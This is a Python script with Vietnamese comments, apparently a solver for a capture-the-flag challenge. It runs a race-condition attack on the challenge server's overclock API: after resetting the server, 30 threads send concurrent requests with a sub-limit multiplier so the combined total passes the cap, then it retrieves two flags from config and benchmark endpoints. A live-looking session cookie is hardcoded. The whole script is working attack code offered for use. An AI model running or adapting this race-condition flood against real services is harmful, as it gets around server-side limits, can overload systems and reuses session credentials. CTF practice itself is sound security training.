import requests
import threading
import time

# --- CẤU HÌNH ---
BASE_URL = "https://server-oc.ctf.prgy.in"
URL_OVERCLOCK = f"{BASE_URL}/api/overclock"
URL_RESET = f"{BASE_URL}/api/reset"

# [QUAN TRỌNG] Dán Cookie của bạn vào đây
# Ví dụ: "session=eyJhbGciOiJIUzI1NiJ9..."
COOKIE_VALUE = "connect.sid=s%3A4rzd3gHhmTMsTfFzGA-mDaEeiviFVfj4.1BOpFhXbjtZD4gzaV0oxwClPcxRxR3AdqVf9XWW4bj8" 

headers = {
    "Content-Type": "application/json",
    "Cookie": COOKIE_VALUE,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# Dùng Session để tái sử dụng kết nối TCP -> Tăng tốc độ spam (RPS)
s = requests.Session()
s.headers.update(headers)

flag_found = False

def reset_server():
    try:
        s.post(URL_RESET)
        print("[*] Đã Reset server về trạng thái ban đầu.")
    except:
        pass

def spam_request():
    global flag_found
    while not flag_found:
        try:
            # Gửi multiplier = 90 (nhỏ hơn 100 để không bị chặn ngay lập tức)
            # Nhưng gửi nhiều luồng cùng lúc (Race Condition) để tổng vượt mức
            r = s.post(URL_OVERCLOCK, json={"multiplier": 90}, timeout=3)
            
            if r.status_code == 200:
                text = r.text
                
                # --- CHECK FLAG 1 (Qua config) ---
                # Nếu server phản hồi fetchConfig: true
                if '"fetchConfig":true' in text or '"fetchConfig": true' in text:
                    print(f"\n[!!!] PHÁT HIỆN CONFIG! Đang lấy Flag 1...")
                    # Gọi ngay API lấy config
                    r_config = s.post(f"{BASE_URL}/leConfig")
                    print(f"FLAG 1 RESPONSE: {r_config.text}")
                    flag_found = True
                    return

                # --- CHECK FLAG 2 (Qua Benchmark) ---
                # Nếu server phản hồi showBe: true
                if '"showBe":true' in text or '"showBe": true' in text:
                    print(f"\n[!!!] BENCHMARK UNLOCKED! Đang lấy Flag 2...")
                    # 1. Lấy URL Benchmark
                    r_url = s.get(f"{BASE_URL}/api/benchmark/url")
                    try:
                        be_url = r_url.json().get("url")
                        print(f"Benchmark URL: {be_url}")
                        # 2. Gọi URL đó để lấy flag
                        if be_url:
                            # Nếu URL trả về đường dẫn tương đối, ghép vào Base URL
                            if be_url.startswith("/"):
                                full_url = BASE_URL + be_url
                            else:
                                full_url = be_url
                                
                            r_flag = s.get(full_url)
                            print(f"FLAG 2 RESPONSE: {r_flag.text}")
                            flag_found = True
                    except:
                        print("Lỗi parse JSON benchmark")
                    return
        except Exception as e:
            # Bỏ qua lỗi kết nối do spam quá nhanh
            pass

def run_attack():
    print("--- BẮT ĐẦU TẤN CÔNG RACE CONDITION ---")
    reset_server()
    time.sleep(1)
    
    threads = []
    # Chạy 30 luồng để spam
    for i in range(30):
        t = threading.Thread(target=spam_request)
        threads.append(t)
        t.start()

    try:
        # Chạy trong tối đa 15 giây
        time.sleep(15)
    except KeyboardInterrupt:
        pass
    
    global flag_found
    flag_found = True  # Dừng các luồng

if __name__ == "__main__":
    run_attack()